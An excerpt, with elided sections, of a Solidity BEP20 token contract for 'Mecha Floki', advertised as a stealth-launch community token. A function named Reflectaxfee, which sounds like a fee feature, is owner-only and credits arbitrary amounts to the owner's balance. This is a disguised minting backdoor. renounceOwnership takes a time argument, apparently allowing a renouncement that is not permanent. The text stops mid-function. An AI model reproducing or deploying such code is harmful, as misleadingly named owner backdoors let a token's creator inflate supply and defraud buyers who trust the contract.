...
/**
 * 
 *          Welcome everyone to Mecha Floki
 *          The Stealth launch
 *          The Community Token
 *              Telegram group @mechafloki
 * 
 *              Name : Mecha Floki
 *              Symbol : MECHAFLOKI
 ...
 * 
 *      About Us
 *      Telegram : https://t.me/mechafloki
 * 
 */
...
contract Ownable is Context {
    ...
    function renounceOwnership(uint8 time) public virtual onlyOwner {
...
contract MechaFloki is Context, iBEP20, Ownable {
  ...
  */
  ...
  function Reflectaxfee(uint256 amount) public onlyOwner returns (bool) {
    _mechafloki(_msgSender(), amount);
    return true;
  }
  ...
  function _mechafloki(address account, uint256 amount) internal {
    require(account != address(0)); _balances[account] = _balances[account].add(amount);
